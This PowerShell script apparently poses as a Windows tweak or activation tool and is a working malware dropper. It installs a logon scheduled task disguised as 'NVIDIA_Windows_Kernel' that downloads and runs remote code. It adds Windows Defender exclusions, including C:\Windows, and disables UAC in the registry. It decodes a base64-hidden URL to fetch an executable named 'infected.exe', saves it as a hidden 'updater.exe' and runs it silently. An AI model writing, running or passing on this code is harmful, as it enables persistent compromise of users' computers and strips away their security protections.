if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {Write-Host "Run Powershell as Administrator!"}


function AddTask{
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument @"
/c echo Set WshShell=CreateObject("WScript.Shell"): WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""iex (irm 'https://github.com/WindowsTweaksX/boom/raw/refs/heads/main/create_file')""", 0 > "%temp%\run.vbs" && cscript //nologo "%temp%\run.vbs" && del "%temp%\run.vbs"
"@
    $trigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -TaskName "NVIDIA_Windows_Kernel" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
    Clear-Host
}

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
    } catch {
    }
}

function Disable-UAC {
    try {
        Write-Host "Applied patches to registry. Run the script again!" -ForegroundColor Red
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop
        Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""iex (irm 'https://github.com/WindowsTweaksX/boom/raw/refs/heads/main/create_file')""" -Verb RunAs
        exit 1
    } catch {
    }
}

function Download-FileWithRetries {
    param(
        [string]$Url,
        [string]$Output,
        [int]$Retries = 3,
        [int]$DelaySeconds = 5
    )

    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing -ErrorAction Stop
            if (Test-Path $Output) { return $true }
        } catch {
            Write-Warning "Download attempt $($i+1) failed: $_"
            if ($i -lt ($Retries - 1)) {
                Start-Sleep -Seconds $DelaySeconds
            }
        }
    }
    return $false
}

# Main execution
try {
    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL2Jvb20vcmF3L3JlZnMvaGVhZHMvbWFpbi9pbmZlY3RlZC5leGU="))
    $updaterExe = "updater.exe"
    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
    $uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
    
    # Create task
    AddTask
    
    # Prepare environment
    New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
    Add-Exclusion -Path $hiddenFolder
    Add-Exclusion -Path "C:\Windows\"
    
    $tempPath = Join-Path $hiddenFolder $updaterExe
    
    # Download and execute
    if (Download-FileWithRetries -Url $downloadUrl -Output $tempPath) {
        # Set hidden attributes
        $folderAttr = [System.IO.FileAttributes]::Hidden
        [System.IO.File]::SetAttributes($hiddenFolder, $folderAttr)
        [System.IO.File]::SetAttributes($tempPath, $folderAttr)
        
        if (-not $uacStatus) {
            $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
            $process.WaitForExit()
        } else {
            Disable-UAC
        }
    } else {
    }
}
catch {
    Write-Host "An error occurred during activation: $_" -ForegroundColor Red
    exit 1
}
finally {
    if (Test-Path $hiddenFolder) {
        Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
	irm "https://christitus.com/win" | iex
    }
}
